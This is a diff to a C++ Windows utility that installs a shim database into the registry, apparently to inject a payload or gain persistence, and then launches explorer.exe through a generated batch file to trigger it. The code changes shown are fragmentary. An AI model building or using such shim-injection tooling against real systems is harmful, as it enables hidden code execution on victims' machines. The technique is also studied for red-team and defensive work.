@@ -7,6 +7,21 @@
 #include <stdio.h>
 #include <string>
 
+void make_test()
+{
+    char test_cmd[] = "test.bat";
+    FILE *f = fopen(test_cmd, "w");
+    if (!f) {
+        return;
+    }
+
+    fprintf(f, "explorer.exe\n");
+    fclose(f);
+
+    printf("Deploying a test...\n");
+    WinExec(test_cmd, SW_SHOWNORMAL);
+}
+
 bool install_sdb32(std::string shim_name, std::string shim_path, std::string app_name)
 {
     printf("[*] Trying to install: %s\n", shim_name.c_str());
@@ -58,8 +73,6 @@ bool install_sdb32(std::string shim_name, std::string shim_path, std::string app
     RegCloseKey(hDstKey);
     return true;
 }
-
-
 
 BOOL writeToFile(char* res_data, DWORD res_size, const char *payloadName)
 {
@@ -118,11 +131,11 @@ int main(int argc, char *argv[])
     
     if (install_sdb32(sdb_name, shim_path, app_name)) {
         printf("[+] SDB installed.\n");
+        make_test();
     } else {
         printf("[-] SDB installation failed. Try to run it as Administrator!\n");
     }
 
     system("pause");
-
     return 0;
 }
